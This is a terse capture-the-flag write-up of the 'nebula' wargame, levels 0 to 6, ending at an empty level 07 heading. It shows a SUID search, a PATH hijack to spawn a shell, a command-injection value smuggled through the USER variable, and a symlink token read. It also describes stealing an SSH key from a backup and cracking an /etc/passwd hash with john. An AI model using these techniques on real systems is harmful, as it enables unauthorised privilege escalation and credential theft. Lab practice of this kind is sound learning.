
# LEVEL00
```
find / -perm -4000 -print
```
and go to the flag

# LEVEL01 

```bash
level01@nebula:/home/flag01$ echo '/bin/bash' > /tmp/echo  
level01@nebula:/home/flag01$ chmod +x /tmp/echo  
level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01    
flag01@nebula:/home/flag01$ getflag
```

# LEVEL02
```bash
level02@nebula:/home/flag02$ export USER="haha;getflag"
level02@nebula:/home/flag02$ ./flag02    
about to call system("/bin/echo haha;getflag is cool")  
haha  
You have successfully executed getflag on a target account
```
# LEVEL03
started a reverse shell then did getflag

# LEVEL04

created a soft link to the token via `level04@nebula:/tmp$ ln -s /home/flag04/token fksa`
then executed flag4 on it to get the password of the flag04 account.

# LEVEL05

did `ls -a` saw the .backup directory with weak permissions then dezipped the tar file and go the ssh private key --> `ssh -i id_rsa flag05@localhost`

# LEVEL06
got the hash in /etc/passwd and used `john` on the flag06 password to find `hello`

# LEVEL07
